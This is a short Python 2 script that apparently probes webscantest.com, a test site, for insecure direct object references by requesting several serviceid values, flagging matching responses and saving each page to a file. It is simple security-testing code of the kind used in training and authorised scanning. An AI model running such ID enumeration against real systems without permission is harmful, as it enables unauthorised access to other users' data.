import mechanize

url = "http://www.webscantest.com/business/access.php?serviceid="
attackNumber = 1
for i in range(5):
    res = mechanize.urlopen(url+str(i))
    content = res.read()
    
    #  check if the content is accessible
    if content.find("You service") > 0:
    	print "Possible Direct Object Reference"
    	
    output = open('response/'+str(attackNumber)+'.txt', 'w')
    output.write(content)
    output.close()
    print attackNumber
    attackNumber += 1
	
